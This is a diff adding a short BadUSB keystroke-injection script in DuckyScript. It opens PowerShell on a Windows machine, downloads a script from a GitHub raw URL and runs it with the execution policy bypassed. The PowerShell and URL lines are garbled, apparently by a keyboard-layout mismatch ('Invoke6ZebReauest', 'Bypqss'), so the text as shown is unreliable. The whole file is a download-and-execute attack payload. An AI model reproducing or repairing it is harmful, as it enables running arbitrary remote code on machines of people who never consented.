@@ -1,0 +1,17 @@
+REM This Badusb will download a powershell script from a github raw and execute it, 
+
+REM Open windows powershell
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 750
+
+STRING Invoke6ZebReauest 6Uri https.>>rqz<githubusercontent<co;>Sn)zQlice>Flip6Her6)>;qin>bqdusb>scripts>z)@>dl<ps! 6OutFile dl<ps!
+ENTER
+DELAY 750
+
+STRING PozerShell 6NoProfile 6ExecutionPolicy Bypqss 6Co;;qnd 31 4<>dl<ps!43
+ENTER
